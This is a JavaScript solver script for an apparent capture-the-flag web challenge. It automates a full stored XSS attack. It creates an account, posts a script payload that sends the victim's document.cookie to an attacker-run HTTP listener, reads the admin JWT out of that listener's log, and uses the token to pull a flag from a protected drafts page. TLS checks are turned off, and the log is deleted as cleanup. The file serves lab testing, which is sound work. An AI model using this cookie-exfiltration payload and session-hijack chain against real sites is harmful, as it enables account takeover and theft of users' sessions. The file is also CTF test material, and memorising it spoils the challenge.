import fetch from "node-fetch";
import https from 'https';
// import http from 'http';
import { NodeSSH } from "node-ssh";
import { writeFile } from "node:fs/promises";

const SSH_PORT = process.env.SSH_PORT;
const DOMAIN = process.env.DOMAIN;
const SSH_DOMAIN = process.env.SSH_SERVICE_INTERNAL_URL;

console.log("Domain: " + DOMAIN);

// CTF
const CTF_FLAG_REGEX = /flag\{.*\}/;
const CTF_FLAG_OUTPUT_PATH = "/run/solution/flag.txt";

// Pages
// const HOME_URL = `http://web.${DOMAIN}:8080`;
const HOME_URL = `https://web.${DOMAIN}`;
const CREATE_ACCOUNT_URL = `${HOME_URL}/create-account`;
const LOGIN_URL = `${HOME_URL}/login`;
const CREATE_POST_URL = `${HOME_URL}/create-post`;
const DRAFTS_URL = `${HOME_URL}/drafts`;

// Login information
const USERNAME = "hello";
const PASSWORD = "1234";
const EMAIL = "hello@mail.com";

// SSH
const SSH_USERNAME = "gl";
const SSH_PASSWORD = "hf";
const HTTP_SERVER_PORT = 5555;
const HTTP_SERVER_LOG = "jwt_server.log";
const GET_IP_COMMAND = "ifconfig eth0 | awk -F'[: ]+' '/inet / {print $4}'";

try {

    // Setup SSH connection
    const ssh = new NodeSSH();
    await ssh.connect({
        host: SSH_DOMAIN,
        port: SSH_PORT,
        username: SSH_USERNAME,
        password: SSH_PASSWORD,
    });

    // Get ip address from openssh service
    const sshIpAddress = await ssh
        .execCommand(GET_IP_COMMAND)
        .then((result) => result.stdout);

    // Disable SSL cert validation (like --insecure)
    // const agent = new http.Agent({
    //     rejectUnauthorized: false,
    // });
    const agent = new https.Agent({
        rejectUnauthorized: false,
    });

    // Setup XSS post information
    const POST_TITLE = "Very Cool Title";
    const POST_BODY = `Very cool body.<script>fetch('http://${sshIpAddress}:${HTTP_SERVER_PORT}?'%2Bdocument.cookie);</script>`;

    // Create a new user
    await fetch(CREATE_ACCOUNT_URL, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `username=${USERNAME}&email=${EMAIL}&password=${PASSWORD}`,
        redirect: "manual",
        agent,
    });

    // Log in to our created account
    const userJwt = await fetch(LOGIN_URL, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `username=${USERNAME}&password=${PASSWORD}`,
        redirect: "manual",
        agent,
    })
        .then((response) => response.headers.raw()["set-cookie"]
            .find((value) => value.startsWith("jwt"))
            .match(/jwt=(.*);/)[1]);

    // Create XSS post
    await fetch(CREATE_POST_URL, {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            Cookie: `jwt=${userJwt}`,
        },
        body: `title=${POST_TITLE}&body=${POST_BODY}&isDraft=`,
        redirect: "manual",
        agent,
    });

    // Start HTTP server and wait for JWT
    const adminJwt = await new Promise(async (resolve) => {
        // Start HTTP server
        const httpServerPid = await ssh.execCommand(`nohup python3 -m http.server ${HTTP_SERVER_PORT} > ${HTTP_SERVER_LOG} 2>&1 & echo $!`)
            .then((result) => result.stdout.trim());

        // Listen for JWT
        ssh.exec("tail", ["-f", HTTP_SERVER_LOG], {
            onStdout(chunk) {
                const output = chunk.toString("utf8");
                const match = output.match(/"GET\s(.*?)\sHTTP\/1\.1"/)
                if (match && match[1]) {
                    const url = new URL(`http://dummy${match[1]}`);
                    const adminJwt = url.searchParams.get("jwt");
                    if (adminJwt) {
                        // Kill HTTP server and remove log file (cleanup)
                        ssh.execCommand(`kill ${httpServerPid} && rm ${HTTP_SERVER_LOG}`);
                        resolve(adminJwt);
                    }
                }
            },
        })
    });

    // Go to draft page with admin JWT and find flag
    const flag = await fetch(DRAFTS_URL, {
        method: "GET",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            Cookie: `jwt=${adminJwt}`,
        },
        redirect: "manual",
        agent,
    })
        .then((response) => response.text())
        .then((body) => body.match(CTF_FLAG_REGEX)[0]);

    if (flag) {
        await writeFile(CTF_FLAG_OUTPUT_PATH, flag);

        console.log("Test: Succeeded");
        console.log(flag)
        process.exit(0);
    }
} catch (err) {
    console.log(err);
}

console.log("Test: Failed");
process.exit(1);
